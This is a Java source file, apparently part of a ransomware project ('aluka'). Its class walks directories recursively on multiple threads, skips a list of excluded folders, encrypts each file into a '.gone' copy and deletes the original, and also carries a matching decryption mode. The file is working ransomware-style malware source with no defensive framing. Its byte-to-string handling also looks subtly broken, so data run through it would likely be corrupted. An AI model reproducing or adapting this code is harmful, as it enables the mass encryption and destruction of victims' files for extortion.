package aluka.core;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.List;
import java.util.function.Supplier;
import java.util.logging.Level;

public class FileDeeperBrowser implements Runnable {

	public final static int TAMPON = 117;
	private final static LoggerManagement LOGGER = LoggerManagement.getInstance();
	
	public static byte MODE = 0;
	
	private EncryptionManager encryption = EncryptionManager.getInstance();
	private String startPath;
	private Supplier<List<String>> callback;

	public FileDeeperBrowser(String startPath, Supplier<List<String>> callback) {
		this.startPath = startPath;
		this.callback = callback;
	}

	public void encryptFilesInsidePath() {
		List<String> avoidPaths = callback.get();
		File file = new File(startPath);
		for (File fileObject : file.listFiles()) {
			if (fileObject.isDirectory()) {
				if (!avoidPaths.contains(fileObject.getName().toUpperCase())) {
					Thread anotherDirectory = new Thread(new FileDeeperBrowser(fileObject.getAbsolutePath(), callback));
					anotherDirectory.start();
				}else 
					LOGGER.log(Level.WARNING, "Escaping " + fileObject.getName());
			} else {
				encryptFile(fileObject);
			}
		}
	}

	private void encryptFile(File file) {
		File encryptedFile = new File(file.getAbsolutePath() + ".gone");
		try (BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file));
				BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(encryptedFile))) {
			int l;
			byte[] tampon = new byte[TAMPON];

			while ((l = bis.read(tampon)) > 0) {
				String encryptedString = this.encryption.encryptByte((new String(tampon,0,l)).getBytes());
				bos.write(encryptedString.getBytes());
			}
			bos.close();
			bis.close();
			file.deleteOnExit();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	public void decryptFilesInsidePath() {
		List<String> avoidPaths = callback.get();
		File file = new File(startPath);
		for (File fileObject : file.listFiles()) {
			if (fileObject.isDirectory()) {
				if (!avoidPaths.contains(fileObject.getName().toUpperCase())) {
					Thread anotherDirectory = new Thread(new FileDeeperBrowser(fileObject.getAbsolutePath(), callback));
					anotherDirectory.start();
				}else 
					LOGGER.log(Level.WARNING, "Escaping " + fileObject.getName());
			} else {
				if(fileObject.getName().matches(".*\\.gone"))//Match .gone extension
					decryptFile(fileObject);
			}
		}
	}

	private void decryptFile(File file) {
		String path = file.getAbsolutePath();
		File decryptedFile = new File(path.substring(0,path.length() - 5));
		try (BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file));
				BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(decryptedFile))) {
			int l;
			byte[] tampon = new byte[TAMPON];

			while ((l = bis.read(tampon)) > 0) {
				String decryptedString = this.encryption.decryptByte(new String(tampon,0,l));
				bos.write(decryptedString.getBytes());
			}
			bos.close();
			bis.close();
			file.deleteOnExit();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public static void enableDecryptMode() {
		MODE = 1;
	}
	
	public static void enableEncryptMode() {
		MODE = 0;
	}

	@Override
	public void run() {
		if(MODE == 0)
			this.encryptFilesInsidePath();
		else
			this.decryptFilesInsidePath();
	}
}
